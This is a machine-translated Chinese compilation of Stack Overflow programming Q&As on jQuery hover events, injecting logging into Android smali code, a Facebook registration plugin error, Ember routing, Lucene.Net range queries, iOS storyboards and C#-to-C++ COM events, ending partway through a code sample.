> 时间：2012-09-28T22:34:46.067

您可以使用[委托事件方法](http://api.jquery.com/on/)并绑定悬停事件（即`mouseenter`和`mouseleave`）用于动态创建的具有类*"dimsdiv"*的元素和 ID为*"fpdiv"*的父元素：

```
$("#fpdiv").on({
    mouseenter : function() {
        // hover on
    },
    mouseleave : function() {
        // hover off
    }
}, ".dimsdiv"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T22:34:11.167

```
.on('hover','  has been deprecated in the latest jQuery version.. 
```

您需要使用委托事件来执行此操作。将事件添加到父容器。

第二种方法是在创建元素后添加事件

```
$(function() {
    var addEvent = function() {
        $('.dimsdiv').unbind().hover(function {}, function {});
    }

        // Lets say you are creating your div's here
        $('#btn').on('click', function() {
           // Create Div
             var str = '<div class="dimsdiv" id="'+dim.src+'" cursor:pointer;"></div>'; 
             $('#fpdiv').append(str);

            // Call the function here
            addEvent();

        });
});​ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T22:36:19.527

的简写`hover`别名`on`在 1.8 中被删除。您可以改用该`hover()`方法。它接受一个或两个函数作为参数来处理悬停和悬停事件。

```
$('#'+dim.src).hover(
  function () {
    // hover in code here
  },
  function () {
   // hover out code here
  }
); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T22:37:11.883

您需要的是一个实时功能，因此您可以设置一次，它将影响您的动态 html。

[http://api.jquery.com/live/](http://api.jquery.com/live/)

# android - 修改 .smali 文件

> ID：12648196
> 
> 赞同：14
> 
> 时间：2012-09-28T22:31:00.750
> 
> 标签：android, apk, logcat, smali

我对一些 android apk 进行了逆向工程，以添加一些用于功能测试的工具。我想知道给定一个 smali 如下我如何添加类似的东西

```
Log.e(TAG, "some descritpion", e); 
```

到 .smali 文件中的每个方法。

```
.class public Ld;
.super Landroid/view/View;
.source "SourceFile"

# instance fields
.field a:Z

.field b:Lcom/rovio/ka3d/App;

# direct methods
.method public constructor <init>(Lcom/rovio/ka3d/App;)V
    .locals 2
    .parameter

    .prologue
    const/4 v1, 0x1

    .line 317
    invoke-direct {p0, p1}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 313
    const/4 v0, 0x0

    iput-boolean v0, p0, Ld;->a:Z

    .line 314
    const/4 v0, 0x0

    iput-object v0, p0, Ld;->b:Lcom/rovio/ka3d/App;

    .line 318
    iput-object p1, p0, Ld;->b:Lcom/rovio/ka3d/App;

    .line 319
    invoke-virtual {p0, v1}, Ld;->setFocusable(Z)V

    .line 320
    invoke-virtual {p0, v1}, Ld;->setFocusableInTouchMode(Z)V

    .line 321
    return-void
.end method

# virtual methods
.method public a(Z)V
    .locals 4
    .parameter

    .prologue
    const/4 v3, 0x0

    .line 325
    invoke-virtual {p0}, Ld;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "input_method"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    .line 326
    invoke-virtual {p0}, Ld;->getWindowToken()Landroid/os/IBinder;

    move-result-object v1

    invoke-virtual {v0, v1, v3}, Landroid/view/inputmethod/InputMethodManager;->hideSoftInputFromWindow(Landroid/os/IBinder;I)Z

    .line 327
    if-eqz p1, :cond_0

    .line 329
    invoke-virtual {p0}, Ld;->getWindowToken()Landroid/os/IBinder;

    move-result-object v1

    const/4 v2, 0x2

    invoke-virtual {v0, v1, v2, v3}, Landroid/view/inputmethod/InputMethodManager;->toggleSoftInputFromWindow(Landroid/os/IBinder;II)V

    .line 330
    invoke-virtual {p0}, Ld;->requestFocus()Z

    .line 333
    :cond_0
    iput-boolean p1, p0, Ld;->a:Z

    .line 334
    return-void
.end method

.method public onCreateInputConnection(Landroid/view/inputmethod/EditorInfo;)Landroid/view/inputmethod/InputConnection;
    .locals 3
    .parameter

    .prologue
    .line 343
    new-instance v0, La;

    iget-object v1, p0, Ld;->b:Lcom/rovio/ka3d/App;

    const/4 v2, 0x0

    invoke-direct {v0, v1, p0, v2}, La;-><init>(Lcom/rovio/ka3d/App;Landroid/view/View;Z)V

    .line 345
    const/4 v1, 0x0

    iput-object v1, p1, Landroid/view/inputmethod/EditorInfo;->actionLabel:Ljava/lang/CharSequence;

    .line 350
    const v1, 0x80090

    iput v1, p1, Landroid/view/inputmethod/EditorInfo;->inputType:I

    .line 351
    const/high16 v1, 0x1000

    iput v1, p1, Landroid/view/inputmethod/EditorInfo;->imeOptions:I

    .line 352
    return-object v0
.end method 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-09-28T23:37:03.873

调用 Log.e() 的实际代码相当简单。这将涉及以下内容：

```
const-string v0, "MyTag"
const-string v1, "Something to print"
# assuming you have an exception in v2...
invoke-static {v0, v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I 
```

但是，您必须小心使用的寄存器。您不想破坏具有稍后将使用的值的寄存器。

所以你有2个选择：

1.  找到“安全”未使用的寄存器，并使用它们（可能很棘手）
2.  增加方法的寄存器数，并使用新创建的寄存器

对于数字 2，唯一的问题是新寄存器不在寄存器范围的末尾 - 它们实际上就在参数寄存器之前。

例如，让我们采用一个总共有 5 个寄存器（`.registers 5`）的方法，其中 3 个是参数寄存器。所以你有 v0 和 v1 是非参数寄存器，p0-p2 是 3 个参数寄存器，是 v2-v4 的别名。

如果您需要添加额外的 2 个寄存器，则可以将其增加到`.registers 7`. 参数寄存器位于寄存器范围的末尾，因此 p0-p2 现在别名为 v4-v6，而 v2 和 v3 是可以安全使用的新寄存器。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-26T16:24:11.210

对JesusFreke 回答的评论太大的寄存器评论。值得一提的是，如果你有`.local`指令而不是`.register`指令，那么编号方案会有所不同。粗略地说，这些指令以下列方式相关：

```
.registers = .locals + NUMBER_OF_PARAMETERS 
```

因此，如果您有一个具有 4 个参数并使用 3 个以上寄存器的函数，则可能出现的指令是`.registers 7`或`.locals 3`。

您将获得寄存器设置如下：

```
v0
v1
v2
v3 <==> p0
v4 <==> p1
v5 <==> p2
v6 <==> p3 
```

来源：[https ://github.com/JesusFreke/smali/wiki/Registers](https://github.com/JesusFreke/smali/wiki/Registers)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-08-02T12:06:52.183

添加 smali 代码的一种更简单的方法是在测试 android 应用程序中编写 java 代码。使用 apktool 反汇编。查看 smali 文件以识别 smali 代码并将其用于注入您已反汇编的其他应用程序。

在此处下载 apktool：http: [//ibotpeaches.github.io/Apktool/](http://ibotpeaches.github.io/Apktool/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-02-23T23:38:29.637

我一直在使用的另一个选项，我`FileWritter.java`为此创建了一个类，是打开您最喜欢的 IDEA（**Intellij/Android Studio**），下载**Java2Smali**插件以获得正确的 IDEA 并运行该插件。

*简而言之 ：*

*   打开你的**AndroidStudio/Intellij**
*   转到文件/设置
*   点击搜索栏并搜索“插件”
*   登陆插件 UI 后，请确保在“ **MarketPlace** ”选项卡上
*   搜索**java2smali**，安装并重新启动 IDEA

这是[java2smali插件的链接](https://plugins.jetbrains.com/plugin/7385-java2smali)

*如何使用？*

*   用 Java 编写代码（建议用 Java 而不是 Kotlin 编写，就像您尝试将其反编译为 smali 一样，您将从 Kotlin->Java 获得额外代码，您反编译的应用程序可能不支持这些代码，例如应用程序可能是用 Java 编写或可能不包含任何 Kotlin 库）
*   编写完要转换为 smali 的代码后，单击 **Build/Compile To Smai**
*   您将被自动重定向到已编译的 Smali 代码（该 Smali 代码将在您的项目中生成在原始 Java 代码旁边）
*   从这一点开始做任何你想做的事，你可以查看编译的 Smali 文件并找到调用所需代码的行，或者根据需要实现整个 Smali 文件。

==================================================== ======================= 干杯！

# facebook - Facebook 注册插件在使用长/许多自定义字段登录 FB 后返回“无效的 client_id”

> ID：12648203
> 
> 赞同：1
> 
> 时间：2012-09-28T22:31:44.980
> 
> 标签：facebook, json, plugins, facebook-javascript-sdk, registration

我正在使用带有以下代码的 FB 注册插件：

```
<html xmlns:fb="http://ogp.me/ns/fb#">

    <script type="text/javascript">
    window.fbAsyncInit = function() { FB.init({appId: 'xxx', status: true, cookie: true, xfbml: true}); };
    (function() {
        var e = document.createElement('script');
        e.async = true;
        e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
        document.getElementById('fb-root').appendChild(e);
    })();
</script> 
```

这是我想要的字段列表：

```
 <?php /* There seems to be a character limit for fields causing "invalid client_id" on log in/out */?>
                        <fb:registration redirect-uri="https://xxx.secure.xxx.com/register/fb_submit.php"
                            fields='[
                            {"name":"name","view":"prefilled"},
                            {"name":"email"},
                            {"name":"password"},
                            {"name":"s_question","description":"Secret Question","type":"select","options":{"2":"In which city were you born?","4":"What is your favorite book?","3":"What is your favorite pets name?","6":"What is your favorite vacation spot?","1":"What is your mothers maiden name?"}},
                            {"name":"s_answer","type":"text","description":"Secret Answer"},
                            {"name":"first_name"},
                            {"name":"last_name"},
                            {"name":"address_co","description":"Care of (Optional)","type":"text","no_submit":true},
                            {"name":"address","description":"Mailing Address","type":"text"},
                            {"name":"address2","description":"Apartment/Unit","type":"text","no_submit":true},
                            {"name":"street_address","description":"Street Address (if using a P.O. box above)","type":"text","no_submit":true},
                            {"name":"location","view":"prefilled"},
                            {"name":"city","view":"not_prefilled","description":"City","type":"text"},
                            {"name":"state","view":"not_prefilled", "description":"State","type":"select","options":{"AA":"AA - Armed Forces Americas","AE":"AE - Armed Forces","AK":"AK - Alaska","AL":"AL - Alabama","AP":"AP - Armed Forces Pacific","AR":"AR - Arkansas","AS":"AS - American Samoa","AZ":"AZ - Arizona","CA":"CA - California","CO":"CO - Colorado","CT":"CT - Connecticut","DC":"DC - District of Columbia","DE":"DE - Delaware","FL":"FL - Florida","FM":"FM - Federated States of Micronesia","GA":"GA - Georgia","GU":"GU - Guam","HI":"HI - Hawaii","IA":"IA - Iowa","ID":"ID - Idaho","IL":"IL - Illinois","IN":"IN - Indiana","KS":"KS - Kansas","KY":"KY - Kentucky","LA":"LA - Louisiana","MA":"MA - Massachusetts","MD":"MD - Maryland","ME":"ME - Maine","MH":"MH - Marshall Islands","MI":"MI - Michigan","MN":"MN - Minnesota","MO":"MO - Missouri","MP":"MP - Northern Mariana Islands","MS":"MS - Mississippi","MT":"MT - Montana","NC":"NC - North Carolina","ND":"ND - North Dakota","NE":"NE - Nebraska","NH":"NH - New Hampshire","NJ":"NJ - New Jersey","NM":"NM - New Mexico","NV":"NV - Nevada","NY":"NY - New York","OH":"OH - Ohio","OK":"OK - Oklahoma","OR":"OR - Oregon","PA":"PA - Pennsylvania","PR":"PR - Puerto Rico","PW":"PW - Palau","RI":"RI - Rhode Island","SC":"SC - South Carolina","SD":"SD - South Dakota","TN":"TN - Tennessee","TX":"TX - Texas","UT":"UT - Utah","VA":"VA - Virginia","VI":"VI - Virgin Islands","VT":"VT - Vermont","WA":"WA - Washington","WI":"WI - Wisconsin","WV":"WV - West Virginia","WY":"WY - Wyoming"}},
                            {"name":"zip","description":"5-digit Zip Code","type":"text"},
                            {"name":"phone","description":"Phone (800-555-1212)","type":"text"},
                            {"name":"referred_by","description":"Referred by-Email or site nickname (Optional)","type":"text","no_submit":true},
                            {"name":"cert_code","description":"Gift Certificate Code (Optional)","type":"text","no_submit":true},
                            {"name":"sel_hear_about","description":"How Did You Hear About Us?","type":"select","options":{"1":"Friend","2":"Newspaper","3":"Magazine","4":"Internet Search","5":"Internet Ad","6":"Website","8":"site2","9":"site3","10":"Other","11":"TV","12":"Radio"}},
                            {"name":"hear_about","description":"newspaper/blog/website/friend name? (Optional) ","type":"text","no_submit":true},
                            {"name":"birthday"},
                            {"name":"hours","description":"Hours Spent Reading per Week (Optional)","type":"select","options":{"0":"0","1-5":"1-5","6-10":"6-10","11-20":"11-20","21-30":"21-30","31-40":"31-40","41+":"41+"},"no_submit":true}
                            ]' onvalidate="validate">
                        </fb:registration> 
```

这是我的 validate() 函数：

```
 function validate(form)
    {
        errors = {};
        var dt = new Date(), expiryTime = dt.setTime( dt.getTime() + 1000*5 );
        var expires = dt.toGMTString();

        if (form.first_name == "")
        {
            errors.first_name = "Please choose a First Name";
        }

        if (form.s_question == "-1")
        {
            errors.s_question = "Please choose a Secret Question";
        }
        if (form.s_answer == "")
        {
            errors.s_answer = "Please type an answer to your Secret Question";
        }
        if (form.address_co !== "")
        {
            set_cookie( 'address_co', form.address_co, expires, '/register', 'secure.xxx.com', true );
        }
        if (form.address == "")
        {
            errors.address = "Please type your mailing address";
        }
        if (form.address2 !== "")
        {
            set_cookie( 'address2', form.address2, expires, '/register', 'secure.xxx.com', true );
        }
        if (form.street_address !== "")
        {
            set_cookie( 'street_address', form.street_address, expires, '/register', 'secure.xxx.com', true );
        }
        if (form.zip == "")
        {
            errors.zip = "Please type a 5-digit Zip Code"
        }
        else if (form.zip.length != 5)
        {
            errors.zip = "Zip Code must be 5 digits";
        }
        else if (isNaN(form.zip))
        {
            errors.zip = "Zip Code must be a number";
        }

        if (form.phone == "")
        {
            errors.phone = "Please type your phone number";
        }
        if (form.referred_by !== "")
        {
            set_cookie( 'referred_by', form.referred_by, expires, '/register', 'secure.xxx.com', true );
        }
        if (form.cert_code !== "")
        {
            set_cookie( 'cert_code', form.cert_code, expires, '/register', 'secure.xxx.com', true );
        }
        if (!form.sel_hear_about)
        {
            errors.sel_hear_about = "Please choose how you heard about us";
        }
        if (form.hear_about !== "")
        {
            set_cookie( 'hear_about', form.hear_about, expires, '/register', 'secure.xxx.com', true );
        }
        if (form.hours !== "-1")
        {
            set_cookie( 'hours', form.hours, expires, '/register', 'secure.xxx.com', true );
        }

        return errors;
    } 
```

如果用户在访问此注册表单时已经登录到 FB，则填充 FB 字段并且该表单有效。**但是，如果用户没有登录 FB 并在表单上选择 FB 提示**“登录以使用您的个人资料信息预先填写下面的表单。”，然后向 FB 提供登录凭据，**该表单就会消失并被相当通用的替换来自 FB 的“client_id”错误**。

如果用户随后刷新页面，则他/她已登录 FB，并填充了正确的 FB 字段。

我已经验证了 JSON 字段列表。在测试过程中，我发现如果我将字段列表缩减为：

```
 fields='[
                            {"name":"name","view":"prefilled"},
                            {"name":"email"},
                            {"name":"password"},
                            {"name":"s_question","description":"Secret Question","type":"select","options":{"2":"In which city were you born?","4":"What is your favorite book?","3":"What is your favorite pets name?","6":"What is your favorite vacation spot?","1":"What is your mothers maiden name?"}},
                            {"name":"s_answer","type":"text","description":"Secret Answer"},
                            {"name":"first_name"},
                            {"name":"last_name"},                                                               ]' onvalidate="validate"> 
```

然后我没有得到错误。如果我重新添加最长的字段（上面的状态字段），则会返回 client_id 错误。除了添加状态，我可以添加其他较短字段的组合并得到相同的错误。这让我觉得我达到了 JSON 字段列表的某种最大大小限制。可能不是发送到 FB 的实际 JSON，而是在登录后 FB 发回的相应隐藏字段中。

如果我无法解决这个问题，我计划只获取基本的 FB 字段并将其余字段移至另一个页面。当然，由于表格和我的支持注册，我更喜欢将它留在一块。将 FB 数据加载到表单中（刷新时）后，代码所有工作。

感谢您对这个冗长的描述的耐心等待。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T17:39:17.257

我对此没有任何解决办法，我只能提供一个可能的（不，我实际上认为最有可能的）解释：

与所有其他插件一样，该`<fb:registration>`标签的作用基本上是在您的页面中创建一个 iframe，它将所有必要的参数作为 GET 参数传递到查询字符串中。

因此，您为注册表单定义的许多字段意味着 iframe 的 URL 中的查询字符串很长。

问题是，浏览器限制了 URL 的可能长度 - 请参阅[https://stackoverflow.com/a/417184/1427878](https://stackoverflow.com/a/417184/1427878)，[http://www.boutell.com/newfaq/misc/urllength.html](http://www.boutell.com/newfaq/misc/urllength.html)

Web 服务器也这样做，在他们说，“呃，这对我来说通过 GET 处理有点多，很抱歉，但*不*抱歉......”</p>

因此，虽然您的注册表单可能适用于用户已登录时定义的许多字段，因为 iframe URL 的长度保持在您的浏览器或 Facebook 的服务器强制执行的限制之下——如果用户*未登录*并单击登录按钮，它们通过 Facebook Auth 流程重定向，并且在成功登录后它们应该“发送回”的 URL（在这种情况下是带有所有 GET 参数的注册表单的地址）作为 GET 参数传输到Auth 对话 URL 以及其他参数。（并且在将一个 URL 作为 GET 参数传输到另一个 URL 中时应用的必要 URL 编码会更糟……）

这会导致一个*非常长的*URL，在浏览器或 Facebook 服务器强制执行的限制下，无法再传输/处理该 URL。（由于您收到 Facebook 的错误消息，因此很可能 Facebook 的服务器拒绝在这种情况下处理它。）

因此，您可以尝试使用 Facebook 打开错误报告——他们设置最大 GET URL 长度的限制*可以*解决此问题；但如果他们*愿意*这样做，可能是另一个问题。（因为允许更长的请求 URL 可能还有其他含义。）

And even if they did, you might still hit road blocks with the browsers your users are using – if the current limit in Internet Explorer is still 2,048 characters for the path part of an URL, that might be the next part where the registration form with to many fields will break on the frontend …</p>

# ember-router - 部分页面的路由器

> ID：12648205
> 
> 赞同：0
> 
> 时间：2012-09-28T22:32:01.403
> 
> 标签：ember-router

视图 <--> URL 匹配对是否实际上意味着路由器必须控制整个页面而不能用于控制页面的子集？我有一种情况，Ember 用于页面的一部分，其中最外层的容器视图被手动添加到 DOM 元素。一种解决方法是将整个页面转换为 Ember，但也许还有其他方法？感谢您的任何指点！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:31:31.130

您可以指定`outlets`插入页面的动态部分。出口呈现当前视图。在该视图中，可以有另一个出口来显示子视图。

看这个例子：

**申请模板**

```
<div id="content">
  <nav> .. menu part .. </nav>
  {{outlet}}
</div> 
```

这会呈现应用程序的动态部分。例如，当您浏览到时，`/pages`您可以在其中显示页面列表。当您转到“/pages/1”时，-template 中有一个`{{outlet}}`呈现`pages`-template 的`page`内容。

**页面模板**

```
<ul>
{{#each page in controller}}
  <li>{{#linkTo page}}{{page.name}}{{/linkTo}}</li> 
{{/each}}
</ul>
{{outlet}} 
```

**页面模板**

```
<h2>{{name}}</h2> 
```

页面名称标题现在呈现在页面列表下方。
这样您就可以根据需要添加尽可能多的动态内容。

# c# - Lucene.Net 大于/小于 TermRangeQuery？

> ID：12648206
> 
> 赞同：6
> 
> 时间：2012-09-28T22:32:32.830
> 
> 标签：c#, lucene, lucene.net

我已经建立了一个 Lucene.net 书籍索引。一切正常，但我需要添加另一种查询索引的方法，但我不知道该怎么做。

基本上每本书都有适合的年龄范围。这由两列表示 - minAge 和 maxAge。两列都是整数。

我在以下循环中索引和存储这些字段

```
foreach (var catalogueBook in books)
{
    var book = new Book(catalogueBook.CatalogueBookNo,catalogueBook.IssueId);

    var strTitle = book.FullTitle ?? "";
    var strAuthor = book.Author ?? "";
    // create a Lucene document for this book
    var doc = new Document();

    // add the ID as stored but not indexed field, not used to query on
    doc.Add(
        new Field(
            "BookId",
            book.CatalogueBookNo.ToString(System.Globalization.CultureInfo.InvariantCulture),
            Field.Store.YES,
            Field.Index.NOT_ANALYZED_NO_NORMS,
            Field.TermVector.NO));

    // add the title and author as stored and tokenized fields, the analyzer processes the content
    doc.Add(
        new Field("FullTitle",
            strTitle.Trim().ToLower(), 
            Field.Store.YES, 
            Field.Index.ANALYZED, 
            Field.TermVector.NO));

    doc.Add(
        new Field("Author",
            strAuthor.Trim().ToLower(),
            Field.Store.YES,
            Field.Index.ANALYZED,
            Field.TermVector.NO));

    doc.Add(
        new Field("IssueId", 
            book.IssueId, 
            Field.Store.YES, 
            Field.Index.NOT_ANALYZED_NO_NORMS, 
            Field.TermVector.NO));

    doc.Add(
        new Field(
            "PublicationId",
            book.PublicationId.Trim().ToLower(),
            Field.Store.YES,
            Field.Index.NOT_ANALYZED_NO_NORMS,
            Field.TermVector.NO));

    doc.Add(
        new Field(
            "MinAge",
            book.MinAge.ToString("0000"),
            Field.Store.YES,
            Field.Index.NOT_ANALYZED_NO_NORMS,
            Field.TermVector.NO));

    doc.Add(
        new Field(
            "MaxAge",
            book.MaxAge.ToString("0000"),
            Field.Store.YES,
            Field.Index.NOT_ANALYZED_NO_NORMS,
            Field.TermVector.NO));

    doc.Add(new NumericField("Price",Field.Store.YES,true).SetDoubleValue(Convert.ToDouble(book.Price)));

    //Now we can loop through categories
    foreach(var bc in book.GetBookCategories())
    {
        doc.Add(
            new Field("CategoryId",
                bc.CategoryId.Trim().ToLower(),
                Field.Store.YES,
                Field.Index.NOT_ANALYZED_NO_NORMS,
                Field.TermVector.NO));
    }

    // add the document to the index
    indexWriter.AddDocument(doc);
}

// make lucene fast
indexWriter.Optimize();
} 
```

如您所见，我正在填充 minAge 和 maxAge 字段，因为我认为对它运行 TermRangeQuery 是最简单的。

但是，我需要使用 Age 查询 minAge 和 maxAge 列，以查看该 Age 是否在 minAge 和 maxAge 定义的 Age 范围内。

Sql 将是

```
Select * 
From books 
where @age >= minAge and @age <= maxAge 
```

不幸的是，我看不到这样做的方法。这在 Lucene.Net 中是否可行？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-28T23:05:19.160

如果内存可用，您应该能够使用范围查询来执行此操作。这实际上与标准范围查询相反，但您应该能够做到，例如：

```
+minAge:[* TO @age] +maxAge:[@age TO *] 
```

或者，如果您构建查询对象，则具有上限或下限 null 的 RangeQuery（或者更好的是 NumericRangeQuery）可用作开放式范围。

我以前使用过上面的语法，但支持似乎有点……不稳定。如果这不起作用，您始终可以设置一个足够低的下限 (0) 和高上限（例如 1000），例如：

```
+minAge:[0000 TO @age] +maxAge:[@age TO 1000] 
```

这应该足够安全，除非有任何玛土撒拉。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-29T09:44:27.033

最终在上面 femtoRgon 的回答的帮助下做到了这一点。

```
var q = new TermRangeQuery("MinAge", "0000",searchTerms.Age.ToString("0000"), true, true);
mainQuery.Add(q, BooleanClause.Occur.MUST);
q = new TermRangeQuery("MaxAge", searchTerms.Age.ToString("0000"),"9999", true, true);
mainQuery.Add(q, BooleanClause.Occur.MUST); 
```

翅膀

# ios5 - 在捆绑包 NSBundle 中找不到名为“MainStoryboardV1_iPhone”的情节提要 - 在 iOS 5.0 模拟器中

> ID：12648207
> 
> 赞同：3
> 
> 时间：2012-09-28T22:32:48.110
> 
> 标签：ios5, uistoryboard

我遇到了一个以前从未见过的奇怪错误。

我已经在 iOS 6.0 模拟器下测试了我的应用程序，一切正常。但是当我切换到 iOS 5.0 Simulator 时，我在启动应用程序时收到以下错误

在捆绑包 NSBundle 中找不到名为“MainStoryboardV1_iPhone”的故事板

这发生在启动时。

我检查了配置。MainStoryboardV1_iPhone.storyboard 存在并且配置状态使用“MainStoryboardV1_iPhone”

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-23T09:16:25.027

这基本上是因为您使用基础本地化来翻译故事板。而且此方法仅适用于 iOS 6。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T22:32:48.110

我找到了答案。

我在子目录中有故事板文件。这对于 iOS 6.0 似乎很好，但在 iOS 5.0 中失败了。将故事板文件移动到“根”应用程序目录可以解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-23T01:09:17.813

也发生在我身上。

似乎使用 ios 6 基本本地化会移动情节提要文件，因此 ios 5 找不到该文件。改用英语本地化为我解决了这个问题。

# c# - 使用 C++ 向 COM 公开托管事件

> ID：12648212
> 
> 赞同：1
> 
> 时间：2012-09-28T22:33:31.143
> 
> 标签：c#, c++, events, com, atl

可以公开用 C# 编写的托管事件，以便在使用 c++ 编写的 COM 对象中公开和使用。对com和atl不太熟悉。对于 MSDN 文章中显示的示例，您能否展示一下 C++ 方面的情况？

[http://msdn.microsoft.com/en-us/library/dd8bf0x3.aspx](http://msdn.microsoft.com/en-us/library/dd8bf0x3.aspx)

显示的VB6代码证明它是可行的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-29T14:03:56.060

`IDispEventImpl`C++ 中最简单的方法是，IMO，在 ATL和`IDispEventSimpleImpl`模板的帮助下实现事件接收器。[可以在此处找到](http://support.microsoft.com/kb/194179)示例项目的说明。

有很多关于如何执行此操作的在线资源，例如[this](http://msdn.microsoft.com/en-us/library/b91kf2t0(v=vs.71).aspx)或[this](http://edndoc.esri.com/arcobjects/9.1/arcgisdevhelp/developmentenvs/com/vcpp/events.htm)，但这里是所需步骤的列表：

首先让我们看一下托管方面。

为了提供事件，我们必须执行以下操作：

*   声明一个事件接口（`IDispatch`基于 -）
*   用属性标记 coclass`ComSourceInterfaces`以将事件接口绑定到 coclass
*   在 coclass 中实现匹配事件

这是托管代码：

```
[ComVisible(true), 
 Guid("D6D3565F-..."), 
 InterfaceType(ComInterfaceType.InterfaceIsIDispatch)] //! must be IDispatch
public interface IMyEvents
{
    [DispId(1)] // the dispid is used to correctly map the events
    void SomethingHappened(DateTime timestamp, string message);
}

[ComVisible(true)]
[Guid("E22E64F7-...")]
[ProgId("...")]
[ClassInterface(ClassInterfaceType.None)]
[ComSourceInterfaces(typeof(IMyEvents))] // binding the event interface
public class MyComServer : IMyComServer  
{
    // here we declare the delegate for the event
    [ComVisible(false)]
    public delegate void MyEventHandler(DateTime timestamp, string message);

    // and a public event which matches the method in IMyEvents
    // your code will raise this event when needed
    public event MyEventHandler SomethingHappened;
    ... 
} 
```

现在，回到非托管方面。我将使用 ATL，因为我发现它是编写 COM 客户端的最有效方式，但您可以尝试 MFC 或“手动”进行。

需要执行以下步骤：

*   接收器将继承`IDispEventSimpleImpl`（或`IDispEventImpl`）
*   声明了具有所有需要的方法的接收器映射
*   为每个事件编写处理程序方法
*   接收器向事件源注册
*   最终，当不再需要时，接收器断开连接

这是 ATL C++ 客户端中的代码：

```
// import the typelib of your COM server
// 'named_guids' ensures friendly ID of event interface
#import "myserver.tlb" named_guids 
const UINT SINK_ID = 234231341; // we need some sink id

class MyClient : public IDispEventSimpleImpl<SINK_ID, MyClient, &MyServer::DIID_IMyEvents >
{
    public:
    // now you need to declare a sink map - a map of methods handling the events
    BEGIN_SINK_MAP(MyClient)
      SINK_ENTRY_INFO(SINK_ID, MyServer::DIID_IMyEvents, 0x1, OnSomethingHappened, &someEvent)
                                                   ^      ^      ^                   ^
      // event interface id (can be more than 1)---+      |      |                   |
      // must match dispid of your event -----------------+      |                   |
      // method which handles the event  ------------------------+                   |
      // type information for event, see below --------------------------------------+
    END_SINK_MAP()

// declare the type info object. You will need one for each method with different signature.
// it will be defined in the .cpp file, as it is a static member
static _ATL_FUNC_INFO someEvent;  // 'placeholder' object to carry event information (see below)

// method which handles the event
STDMETHOD (OnSomethingHappened)(DATE timestamp, BSTR message)
{ 
   // usually it is defined it in the .cpp file
}

... 
```

}

现在，我们需要在 cpp 文件中定义类型信息成员（即`someEvent`上面示例中的实例）：

```
_ATL_FUNC_INFO MyClient::traceEvent = { CC_STDCALL, VT_EMPTY, 2 , {VT_DECIMAL, VT_BSTR} };  // dispid = 1
                                               ^        ^     ^              ^
// calling convention (always stdcall) --------+        |     |              |
// type of return value (only VT_EMPTY makes sense) ----+     |              |
// number of parameters to the event -------------------------+              |
// Variant types of event arguments -----------------------------------------+ 
```

这可能很棘手，因为类型映射并不总是显而易见的（例如，托管`int`映射到可能很明显`VT_I4`，但映射到 不太明显`DateTime`）`VT_DECIMAL`。您需要在接收器映射中声明您计划使用的每个事件 - 如果您不需要所有事件，请不要映射它们。

现在您需要将接收器连接到事件源：

```
// IUnknown* pUnk = interface to you COM server instance
pMyClient->DispEventAdvise(pUnk);
// .. from this point, events will be caught by the client
// when you are done, disconnect:
pMyClient->DispEventUnadvise(pUnk); 
```

或多或少就是这样。使用 `IDispEventImpl`而不是`IDispEventSimpleImpl`导致代码更少，因为您不需要提供可能是最丑陋的部分的类型信息对象。但是，它有两个缺点：

*   需要访问类型库（因为它需要读取接口元数据以提供类型信息本身）
*   有点慢（但我猜不是很明显）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:38:41.580

如果您可以使用 C++/CLI，您可以这样做（[源代码](http://msdn.microsoft.com/en-us/library/4b612y2s%28v=vs.80%29.aspx)）：

```
// class that defines methods that will called when event occurs
ref class EventReceiver {
public:
   void OnMyClick(int i, double d) {
      Console::WriteLine("OnClick: {0}, {1}", i, d);
   }

   void OnMyDblClick(String^ str) {
      Console::WriteLine("OnDblClick: {0}", str);
   }
};

int main() {
   EventSource ^ MyEventSource = gcnew EventSource();
   EventReceiver^ MyEventReceiver = gcnew EventReceiver();

   // hook handler to event
   MyEventSource->OnClick += gcnew ClickEventHandler(MyEventReceiver, &EventReceiver::OnMyClick);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-11T13:13:16.103

Zdeslav Vojkovic 提出的解决方案对我来说几乎是完整的答案，但是在 Outlook 加载项中实现接收器时遇到了稳定性问题。在第一次不建议之后，系统变得不稳定，并且可能在下一次建议时崩溃。我的解决方案是将接收器作为 COM 对象。

为简洁起见，我只添加了解决方案的 ATL 方面，因为托管代码可以完全按照 Zdeslav Vojkovic 的建议保留。

我在 Visual Studio 2017 中按照以下步骤操作：

## 创建 ATL 简单对象

1.  右键单击 Project 并选择 Add > New Item...
2.  选择 ATL 简单对象并单击添加按钮
3.  在“其他”选项卡中，为线程模型选择“单”
4.  点击完成

## 填写sink接口详情

在生成的 idl 中添加用于初始化和关闭的处理程序：

```
[
    object,
    uuid(a5211fba-...),
    dual,
    nonextensible,
    pointer_default(unique)
]
interface IMyClient : IDispatch
{
    [id(1), helpstring("method InitHandler"), local] HRESULT InitHandler(IUnknown* myserver);
    [id(2), helpstring("method ShutdownHandler"), local] HRESULT ShutdownHandler(void); 
}; 
```

## 填写头文件（MyClient.h）

```
const UINT SINK_ID = 234231341;
